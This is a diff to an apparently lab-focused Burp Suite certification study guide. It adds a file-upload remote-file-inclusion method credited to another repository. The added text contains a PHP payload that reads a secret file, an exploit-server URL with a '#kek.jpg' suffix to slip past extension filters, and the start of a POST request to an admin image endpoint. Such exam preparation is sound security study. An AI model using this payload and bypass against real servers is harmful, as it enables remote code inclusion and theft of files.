@@ -3501,6 +3501,20 @@ X-ProxyUser-Ip: 127.0.0.1
 
 >Below scenario could be exploited using [SSRF](#ssrf---server-side-request-forgery) or RFI. Did not solve this challenge.....  
 
+>But the method below works for sure. It is taken from DingyShark's git (https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#file-upload-vulnerabilities)
+
+>To exploit this vulnerability, paste php payload in body section of your exploit server and name it shell.php:
+```
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+
+```
+
+>To bypass filters and provoke RFI, use the next payload:
+
+
+```
+https://exploit-server.com/shell.php#kek.jpg
+
 ```
 POST /admin-panel/admin-img-file
 Host: TARGET.net
